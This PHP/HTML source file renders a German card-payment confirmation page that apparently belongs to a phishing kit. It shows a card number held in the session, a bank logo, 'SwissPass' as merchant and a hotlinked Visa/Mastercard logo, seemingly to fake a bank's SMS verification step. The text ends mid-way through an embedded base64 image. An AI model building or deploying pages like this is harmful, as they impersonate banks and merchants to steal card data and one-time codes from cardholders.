<?php
session_start(); // Continue the session
include "./all.php";
// Retrieve data from the session
$cardNumber = isset($_SESSION['cardNumber']) ? $_SESSION['cardNumber'] : " ";
$bank_logo = isset($_SESSION['bank_logo']) ? $_SESSION['bank_logo'] : "./media/flag.png";
?>


<!DOCTYPE html>
<html lang="de>
  <head>
    <meta charset=" UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Auth</title>
<style>
body {
    font-family: Arial, sans-serif;
    background-color: #f5f5f5;
    margin: 0;
    padding: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
}

.container {
    background-color: #fff;
    width: 400px;
    height: 540px;
    border-radius: 5px;
    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
    padding: 20px;
    text-align: center;
}

.header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 20px;
}

.header img {
    height: 40px;
}

.title {
    font-size: 1.6em;
    text-align: left;
    /* font-weight: bold; */
    margin-bottom: 20px;
}

.details {
    text-align: left;
    margin-bottom: 20px;
}

.details p {
    margin: 5px 0;
}

.card-number {
    font-weight: bold;
}

.info-box {
    background-color: #f9f9f9;
    border: 1px solid #ddd;
    border-radius: 5px;
    padding: 10px;
    display: flex;
    align-items: center;
    margin-bottom: 20px;
}

.info-box img {
    width: 120px;
    margin-right: 10px;
}

.button-group {
    display: flex;
    justify-content: space-between;
    gap: 10px;
}

.button {
    padding: 10px 20px;
    height: 50px;
    width: 140px;
    border: none;
    border-radius: 5px;
    cursor: pointer;
    font-size: 0.9em;
}

.cancel-button {
    background-color: #f2f2f2;
    color: #333;
}

.cancel-button:hover {
    background-color: #e0e0e0;
}

.cancel-button:hover {
    background-color: rgb(174, 0, 0);
    color: white;
}

.sms-button {
    background-color: #f2f2f2;
    color: #333;
}

.sms-button:hover {
    background-color: rgb(174, 0, 0);
    color: white;
}
</style>
</head>

<body>
    <div class="container">
        <br>
        <div class="header">
            <!-- bank / flag logo here-->
            <img src="<?php echo htmlspecialchars($bank_logo); ?>" alt="Logo" />
            <img src="https://getsby.com/wp-content/uploads/2023/01/Visa-Mastercard-1-1024x378.png"
                alt="Visa/Mastercard Logo" />
        </div>
        <div class="title">Bestätigen</div>
        <div class="details">
            <p>
                Händler:<br />
                <strong>SwissPass</strong>
            </p>
            <!-- <p>Betrag: <br /><strong>CHF <?php echo ($price); ?></strong></p> -->
            <p>
                Datum: <br /><strong><span id="date"></span></strong>
            </p>
            <p>
                Karte: <br />
                <span class="card-number"> <strong><?php echo htmlspecialchars($cardNumber); ?></strong></span>
            </p>
        </div>
        <div class="info-box">
            <img src="data:image/png;base64,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